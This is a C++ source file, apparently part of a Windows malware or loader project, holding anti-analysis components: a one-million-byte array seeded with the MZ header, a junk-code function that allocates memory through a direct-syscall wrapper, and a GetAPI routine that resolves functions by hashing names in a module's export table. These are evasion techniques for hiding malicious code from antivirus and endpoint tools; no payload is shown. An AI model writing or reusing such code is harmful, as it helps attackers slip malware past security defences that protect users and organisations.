#define _CRT_SECURE_NO_WARNINGS
#include "../../include/utils/obfuscation.h"
#include "../../include/utils/syscalls.h"
#include <cmath>
#include <windows.h>

const unsigned char BIG_JUNK[1000000] = { 0x4D, 0x5A, 0x90 }; 

void ComplexJunk() {
    JUNK_CODE_BLOCK;

    volatile double integrity = 0.0;
    for (int i = 0; i < 500; i++) {
        integrity += std::sin((double)i) * std::cos((double)i);
    }

    SIZE_T sz = 1024 * 5;
    PVOID dummy = nullptr;
    
    NTSTATUS status = SysNtAllocateVirtualMemory(
        (HANDLE)-1, 
        &dummy, 
        0, 
        &sz, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );

    if (status == 0 && dummy) { 
        for (int i = 0; i < 100; i++) {
            ((BYTE*)dummy)[i] = (BYTE)i ^ 0x55;
        }
    }
}

FARPROC GetAPI(HMODULE hMod, DWORD hsh) {
    if (!hMod) return nullptr;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    DWORD exportDirRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) return nullptr;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + exportDirRVA);
    
    DWORD* names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)hMod + exp->AddressOfNameOrdinals);
    DWORD* acts = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* funcName = (const char*)((BYTE*)hMod + names[i]);
        
        if (HashAPI(funcName) == hsh) {
            return (FARPROC)((BYTE*)hMod + acts[ords[i]]);
        }
    }
    return nullptr;
}